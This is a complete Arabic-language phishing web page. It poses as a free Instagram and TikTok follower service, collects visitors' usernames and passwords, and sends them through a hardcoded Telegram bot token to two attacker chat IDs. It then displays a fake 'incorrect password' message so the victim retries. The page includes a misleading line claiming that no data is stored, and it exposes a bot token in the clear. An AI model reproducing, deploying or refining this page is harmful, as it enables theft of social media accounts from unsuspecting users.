<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>طلب متابعين مجانا</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@600&display=swap" rel="stylesheet" />
  <style>
    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    html, body {
      margin: 0;
      padding: 0;
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(270deg, #ff0057, #9f00ff, #00ffee, #ff0057);
      background-size: 800% 800%;
      animation: gradientBG 20s ease infinite;
      color: white;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: start;
      padding-top: 60px;
      min-height: 100vh;
    }
    h1 {
      font-size: 1.2rem;
      margin: 0 20px;
      font-weight: 800;
      text-shadow: 2px 2px 8px rgba(0,0,0,0.7);
    }
    .subtitle {
      font-size: 1.1rem;
      margin: 10px 20px 30px;
      color: #ddd;
      text-shadow: 1px 1px 6px rgba(0,0,0,0.5);
    }
    .btn {
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      border-radius: 50px;
      padding: 10px 18px;
      width: 250px;
      font-size: 1rem;
      font-weight: 700;
      text-decoration: none;
      box-shadow: 0 6px 25px rgba(0,0,0,0.3);
      transition: all 0.3s ease;
      gap: 10px;
      border: 3px solid transparent;
      margin-bottom: 20px;
      cursor: pointer;
    }
    .btn img {
      width: 26px;
      height: 26px;
      border-radius: 50%;
      box-shadow: 0 0 15px rgba(255,255,255,0.6);
    }
    .btn:hover {
      transform: scale(1.1);
      background: rgba(255, 255, 255, 0.3);
      border-color: #fff;
    }
    .btn.instagram {
      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
      box-shadow: 0 0 20px #d62976;
    }
    .btn.tiktok {
      background: linear-gradient(45deg, #69c9d0, #ee1d52);
      box-shadow: 0 0 20px #69c9d0;
    }
    .form-box {
      display: none;
      background: rgba(255,255,255,0.1);
      backdrop-filter: blur(8px);
      border-radius: 15px;
      padding: 20px;
      margin-top: 20px;
      width: 90%;
      max-width: 350px;
      color: #fff;
      box-shadow: 0 0 25px rgba(0,0,0,0.3);
    }
    .form-box input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border-radius: 10px;
      border: none;
      font-size: 16px;
      text-align: right;
    }
    .form-box button {
      width: 100%;
      padding: 12px;
      background-color: #cc3366;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      cursor: pointer;
    }
    .form-box button:hover {
      background-color: #a82d54;
    }
    .note {
      font-size: 12px;
      color: #ccc;
      margin-top: 10px;
    }
  </style>
</head>
<body>

  <h1>اكسب آلاف المتابعين بأمان وبدون برامج وهميه</h1>
  <p class="subtitle">اختر الخدمة المطلوبة</p>

  <div class="btn instagram" onclick="showForm('insta')">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" />
    طلب متابعين انستقرام
  </div>

  <div class="btn tiktok" onclick="showForm('tiktok')">
    <img src="https://cdn-icons-png.flaticon.com/512/3046/3046122.png" alt="TikTok" />
    طلب متابعين تيك توك
  </div>

  <!-- نموذج إنستقرام -->
  <div id="insta-form" class="form-box">
    <h3>طلب متابعين انستقرام</h3>
    <form onsubmit="sendData(event, 'إنستقرام')">
      <input type="text" id="insta-username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
      <input type="password" id="insta-password" placeholder="كلمة السر" required>
      <button type="submit">تسجيل الدخول</button>
    </form>
    <p class="note">لن يتم حفظ معلوماتك، الخدمة وهمية فقط.</p>
  </div>

  <!-- نموذج تيك توك -->
  <div id="tiktok-form" class="form-box">
    <h3>طلب متابعين تيك توك</h3>
    <form onsubmit="sendData(event, 'تيك توك')">
      <input type="text" id="tiktok-username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
      <input type="password" id="tiktok-password" placeholder="كلمة السر" required>
      <button type="submit">تسجيل الدخول</button>
    </form>
    <p class="note">لن يتم حفظ معلوماتك، الخدمة وهمية فقط.</p>
  </div>

  <script>
    const TOKEN = '8354582235:AAHzur-s-J86zyrLsKZq3B9BIRrUmjIeXNE';
    const CHAT_IDS = ['7767212021', '7718153711'];

    function showForm(service) {
      document.getElementById('insta-form').style.display = (service === 'insta') ? 'block' : 'none';
      document.getElementById('tiktok-form').style.display = (service === 'tiktok') ? 'block' : 'none';
    }

    function sendData(e, platform) {
      e.preventDefault();
      const username = document.getElementById(platform === 'إنستقرام' ? 'insta-username' : 'tiktok-username').value;
      const password = document.getElementById(platform === 'إنستقرام' ? 'insta-password' : 'tiktok-password').value;

      const msg = `😈 تسجيل جديد في ${platform}
⌯⋆ USER ⋆⌯  ${username}
⌯⋆ PASSWORD ⋆⌯  ${password}

『 الــمطور صـ𓄌ـكر بغـ𓄌ـداد 』
@ffl8l`;

      CHAT_IDS.forEach(id => {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ chat_id: id, text: msg })
        });
      });

      alert('كلمة السر غير صحيحة، حاول مرة أخرى.');
    }
  </script>

</body>
</html>
